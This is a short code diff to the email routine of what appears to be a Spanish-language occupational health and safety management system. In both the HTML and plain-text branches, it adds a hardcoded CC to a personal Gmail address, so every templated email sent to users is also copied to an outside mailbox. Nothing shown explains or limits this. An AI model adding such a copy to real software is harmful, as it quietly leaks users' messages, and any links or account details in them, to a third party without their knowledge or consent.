@@ -243,12 +243,13 @@ Sistema de Gestión SST
             # Renderizar la plantilla
             rendered_content = template.render(**template_data)
             
-            # Enviar correo según el tipo de plantilla
+            # Enviar correo según el tipo de plantilla con copia a bernardino.deaguas@gmail.com
             if is_html:
                 success = self.email_service.send_email(
                     to_email=user.email,
                     subject=subject,
-                    message_html=rendered_content
+                    message_html=rendered_content,
+                    cc=['bernardino.deaguas@gmail.com']
                 )
             else:
                 # Para texto plano, convertir a HTML básico
@@ -256,7 +257,8 @@ Sistema de Gestión SST
                 success = self.email_service.send_email(
                     to_email=user.email,
                     subject=subject,
-                    message_html=html_content
+                    message_html=html_content,
+                    cc=['bernardino.deaguas@gmail.com']
                 )
             
             if success:
